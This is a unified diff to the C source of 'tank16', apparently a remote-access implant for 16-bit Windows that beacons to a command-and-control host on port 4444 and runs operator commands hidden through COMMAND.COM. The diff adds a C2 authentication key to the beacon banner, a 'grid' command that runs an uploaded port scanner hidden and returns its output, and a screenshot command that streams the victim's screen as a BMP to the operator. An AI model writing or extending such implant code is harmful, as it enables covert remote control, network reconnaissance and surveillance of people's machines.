@@ -82,6 +82,7 @@ typedef int (*pfn_WSACleanup)(void);
 typedef int (*pfn_WSAGetLastError)(void);
 typedef int (*pfn_gethostname)(char *, int);
 
+static HINSTANCE         g_hinst     = NULL;  /* stored in WinMain for GetModuleFileName */
 static HINSTANCE         g_wsock     = NULL;
 static pfn_htonl         w_htonl     = NULL;
 static pfn_htons         w_htons     = NULL;
@@ -108,6 +109,9 @@ static pfn_gethostname     w_hostname  = NULL;  /* optional — not all stacks e
 #ifndef TANK_C2_PORT
 #define TANK_C2_PORT 4444
 #endif
+#ifndef TANK_C2_KEY
+#define TANK_C2_KEY  00000000
+#endif
 
 #pragma pack(1)
 static struct {
@@ -115,11 +119,13 @@ static struct {
     char           host[64];
     unsigned short port;
     unsigned char  tls;         /* ignored on Win16 — no Schannel */
+    char           key[9];      /* 8 hex chars + NUL — must match Joshua server key */
 } g_clu = {
     "AELDRECLU0001",
     TANK16_STR(TANK_C2_HOST),
     TANK_C2_PORT,
-    0
+    0,
+    TANK16_STR(TANK_C2_KEY)
 };
 #pragma pack()
 
@@ -550,33 +556,32 @@ static void exec_command(SOCKET s, const char *cmd)
     }
 
     /* Wait for child — poll until output size stops changing for 300 ms,
-     * or the 15-second deadline expires.  Breaking on the first non-empty
-     * read truncates output for commands that write in bursts (e.g. dir /s). */
+     * or the 15-second deadline expires.  win16_sleep_ms() yields between
+     * polls so WFW cooperative multitasking is not starved. */
     {
-        unsigned long deadline = GetTickCount() + 15000UL;
-        long   last_fsz   = -1;
+        unsigned long deadline    = GetTickCount() + 15000UL;
+        long          last_fsz    = -1;
+        int           has_stable  = 0;
         unsigned long stable_since = 0;
-        MSG    msg;
 
         while (GetTickCount() < deadline) {
-            if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
-                TranslateMessage(&msg);
-                DispatchMessage(&msg);
-            }
             hf = _lopen(tmpfile, OF_READ);
             if (hf != HFILE_ERROR) {
                 fsz = _llseek(hf, 0, 2);
                 _lclose(hf);
                 if (fsz > 0 && fsz == last_fsz) {
-                    if (!stable_since)
+                    if (!has_stable) {
+                        has_stable   = 1;
                         stable_since = GetTickCount();
-                    else if (GetTickCount() - stable_since >= 300UL)
-                        break;   /* size unchanged for 300 ms — done */
+                    } else if (GetTickCount() - stable_since >= 300UL) {
+                        break;  /* size unchanged for 300 ms — done */
+                    }
                 } else {
-                    stable_since = 0;
+                    has_stable = 0;
                 }
                 last_fsz = fsz;
             }
+            win16_sleep_ms(50);  /* yield + throttle poll rate */
         }
     }
 
@@ -603,6 +608,181 @@ static void exec_command(SOCKET s, const char *cmd)
 /* ----------------------------------------------------------------
  * Session loop
  * ---------------------------------------------------------------- */
+/* -----------------------------------------------------------------------
+ * cmd_grid16: run GRID16.EXE from the same directory as tank16.exe,
+ * capture its output via temp file and send back to Joshua.
+ * Upload GRID16.EXE next to tank16.exe first via 'put'.
+ * ----------------------------------------------------------------------- */
+static void cmd_grid16(SOCKET s, const char *args)
+{
+    char tank_dir[MAX_PATH];
+    char grid_path[MAX_PATH];
+    char tmpdir[MAX_PATH];
+    char tmpfile[MAX_PATH];
+    char cmdline[MAX_PATH + 512];
+    char *sl;
+    HFILE hf;
+    long  fsz;
+    char  chunk[512];
+    int   rd;
+    unsigned long deadline;
+    long  last_fsz    = -1;
+    int   has_stable  = 0;
+    unsigned long stable_since = 0;
+
+    if (!args || !args[0]) {
+        send_str(s, "grid: usage: grid <target> -p <ports> [-t ms] [-b] [-T n]\r\n"
+                    "grid: (requires GRID16.EXE next to tank16.exe)\r\n<<<DONE>>>\n");
+        return;
+    }
+
+    /* Locate GRID16.EXE in the same directory as tank16.exe */
+    GetModuleFileName(g_hinst, tank_dir, sizeof(tank_dir));
+    sl = strrchr(tank_dir, '\\');
+    if (sl) { sl[1] = '\0'; } else { lstrcat(tank_dir, "\\"); }
+    lstrcpy(grid_path, tank_dir);
+    lstrcat(grid_path, "GRID16.EXE");
+
+    hf = _lopen(grid_path, OF_READ);
+    if (hf == HFILE_ERROR) {
+        send_str(s, "grid: GRID16.EXE not found next to tank16.exe\r\n"
+                    "grid: put GRID16.EXE to the tank directory first\r\n<<<DONE>>>\n");
+        return;
+    }
+    _lclose(hf);
+
+    /* Run via COMMAND.COM with output redirected to a temp file */
+    GetWindowsDirectory(tmpdir, sizeof(tmpdir));
+    lstrcat(tmpdir, "\\");
+    sprintf(tmpfile, "%sGD%04X.OUT", tmpdir, (unsigned)(GetTickCount() & 0xFFFF));
+    sprintf(cmdline, "COMMAND.COM /c \"%s\" %s -q > %s", grid_path, args, tmpfile);
+
+    if (WinExec(cmdline, SW_HIDE) < 32) {
+        send_str(s, "grid: WinExec failed\r\n<<<DONE>>>\n");
+        return;
+    }
+
+    /* Wait for grid16 to finish — same stable-size approach as exec_command */
+    deadline = GetTickCount() + 120000UL;  /* 2 minute max scan */
+    while (GetTickCount() < deadline) {
+        hf = _lopen(tmpfile, OF_READ);
+        if (hf != HFILE_ERROR) {
+            fsz = _llseek(hf, 0, 2);
+            _lclose(hf);
+            if (fsz > 0 && fsz == last_fsz) {
+                if (!has_stable) { has_stable = 1; stable_since = GetTickCount(); }
+                else if (GetTickCount() - stable_since >= 500UL) break;
+            } else { has_stable = 0; }
+            last_fsz = fsz;
+        }
+        win16_sleep_ms(200);
+    }
+
+    /* Read and stream the output */
+    hf = _lopen(tmpfile, OF_READ);
+    if (hf == HFILE_ERROR) { send_str(s, "<<<DONE>>>\n"); return; }
+    fsz = _llseek(hf, 0, 2);
+    _llseek(hf, 0, 0);
+    while (fsz > 0) {
+        int want = (int)(fsz < (long)sizeof(chunk) ? fsz : (long)sizeof(chunk));
+        rd = _lread(hf, chunk, want);
+        if (rd <= 0) break;
+        w_send(s, chunk, rd, 0);
+        fsz -= rd;
+    }
+    _lclose(hf);
+    unlink(tmpfile);
+    send_str(s, "<<<DONE>>>\n");
+}
+
+/* ----------------------------------------------------------------
+ * cmd_screenshot16 -- Win16 GDI screen capture; sends 24bpp BMP over socket
+ * ---------------------------------------------------------------- */
+static void cmd_screenshot16(SOCKET s)
+{
+    int     w, h, row;
+    HDC     hdcScr, hdcMem;
+    HBITMAP hBmp;
+    BITMAPINFOHEADER bih;
+    BITMAPINFO       bmi;
+    long    stride, pixel_bytes, total;
+    HANDLE  hRowBuf;
+    char FAR *rowbuf;
+    char    hdr[48];
+    /* Manually-packed 14-byte BITMAPFILEHEADER to avoid struct alignment issues */
+    char    bfh_bytes[14];
+
+    w = GetSystemMetrics(SM_CXSCREEN);
+    h = GetSystemMetrics(SM_CYSCREEN);
+
+    hdcScr = GetDC(NULL);
+    if (!hdcScr) { send_str(s, "screenshot: GetDC failed\r\n<<<DONE>>>\n"); return; }
+    hdcMem = CreateCompatibleDC(hdcScr);
+    hBmp   = CreateCompatibleBitmap(hdcScr, w, h);
+    if (!hdcMem || !hBmp) {
+        if (hBmp)   DeleteObject(hBmp);
+        if (hdcMem) DeleteDC(hdcMem);
+        ReleaseDC(NULL, hdcScr);
+        send_str(s, "screenshot: GDI alloc failed\r\n<<<DONE>>>\n"); return;
+    }
+    SelectObject(hdcMem, hBmp);
+    BitBlt(hdcMem, 0, 0, w, h, hdcScr, 0, 0, SRCCOPY);
+    ReleaseDC(NULL, hdcScr);
+
+    /* 24bpp, positive biHeight = bottom-up (standard BMP) */
+    memset(&bih, 0, sizeof(bih));
+    bih.biSize        = sizeof(bih);
+    bih.biWidth       = w;
+    bih.biHeight      = h;
+    bih.biPlanes      = 1;
+    bih.biBitCount    = 24;
+    bih.biCompression = BI_RGB;
+
+    stride      = (long)(((long)w * 3L + 3L) & ~3L);
+    pixel_bytes = stride * (long)h;
+    total       = 14L + 40L + pixel_bytes;   /* bfh + bih + pixels */
+
+    hRowBuf = GlobalAlloc(GMEM_MOVEABLE, (DWORD)stride);
+    if (!hRowBuf) {
+        DeleteObject(hBmp); DeleteDC(hdcMem);
+        send_str(s, "screenshot: out of memory\r\n<<<DONE>>>\n"); return;
+    }
+    rowbuf = (char FAR *)GlobalLock(hRowBuf);
+
+    /* Send FILE: header */
+    sprintf(hdr, "FILE:%ld\n", total);
+    send_str(s, hdr);
+
+    /* Manually-packed BITMAPFILEHEADER (14 bytes, little-endian) */
+    bfh_bytes[0] = 'B'; bfh_bytes[1] = 'M';
+    bfh_bytes[2] = (char)(total & 0xFF);
+    bfh_bytes[3] = (char)((total >> 8) & 0xFF);
+    bfh_bytes[4] = (char)((total >> 16) & 0xFF);
+    bfh_bytes[5] = (char)((total >> 24) & 0xFF);
+    bfh_bytes[6] = bfh_bytes[7] = bfh_bytes[8] = bfh_bytes[9] = 0;
+    bfh_bytes[10] = 54; bfh_bytes[11] = bfh_bytes[12] = bfh_bytes[13] = 0;
+    w_send(s, bfh_bytes, 14, 0);
+
+    /* BITMAPINFOHEADER (40 bytes) */
+    w_send(s, (char FAR *)&bih, 40, 0);
+
+    /* Pixel data — one row at a time, bottom-up order (rows 0..h-1) */
+    memset(&bmi, 0, sizeof(bmi));
+    bmi.bmiHeader = bih;
+    bmi.bmiHeader.biSizeImage = (DWORD)pixel_bytes;
+    for (row = 0; row < h; row++) {
+        if (GetDIBits(hdcMem, hBmp, (UINT)row, 1,
+                      (LPVOID)rowbuf, &bmi, DIB_RGB_COLORS) > 0)
+            w_send(s, rowbuf, (int)stride, 0);
+    }
+
+    GlobalUnlock(hRowBuf);
+    GlobalFree(hRowBuf);
+    DeleteObject(hBmp);
+    DeleteDC(hdcMem);
+    send_str(s, "<<<DONE>>>\n");
+}
+
 static void run_session(SOCKET s)
 {
     char line[512];
@@ -616,9 +796,10 @@ static void run_session(SOCKET s)
         GetWindowsDirectory(windir, sizeof(windir));
         GetPrivateProfileString("Network", "ComputerName", "unknown",
                                 hostname, sizeof(hostname), "SYSTEM.INI");
-        sprintf(banner, "Tank/1 host=%s os=%u.%u shell=COMMAND.COM\n",
+        sprintf(banner, "Tank/1 host=%s os=%u.%u shell=COMMAND.COM key=%.8s\n",
                 hostname,
-                ver & 0xFF, (ver >> 8) & 0xFF);
+                ver & 0xFF, (ver >> 8) & 0xFF,
+                g_clu.key);
         send_str(s, banner);
     }
 
@@ -659,6 +840,11 @@ static void run_session(SOCKET s)
             send_str(s, "netstat: not available on Win16\r\n<<<DONE>>>\n");
         } else if (lstrcmpi(line, "route") == 0) {
             send_str(s, "route: not available on Win16\r\n<<<DONE>>>\n");
+        } else if (lstrcmpi(line, "screenshot") == 0) {
+            cmd_screenshot16(s);
+        } else if (_fstrncmp(line, "grid", 4) == 0 &&
+                   (line[4] == ' ' || line[4] == '\0')) {
+            cmd_grid16(s, line[4] == ' ' ? line + 5 : "");
         } else if (lstrcmpi(line, "exit") == 0 ||
                    lstrcmpi(line, "quit") == 0) {
             break;
@@ -701,7 +887,8 @@ static SOCKET tank_connect(void)
 int PASCAL WinMain(HINSTANCE hInst, HINSTANCE hPrev,
                    LPSTR lpCmd, int nShow)
 {
-    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
+    (void)hPrev; (void)lpCmd; (void)nShow;
+    g_hinst = hInst;
 
     if (!winsock_load()) return 0;
     toolhelp_load();   /* optional — ps/kill/pinfo unavailable if TOOLHELP.DLL absent */
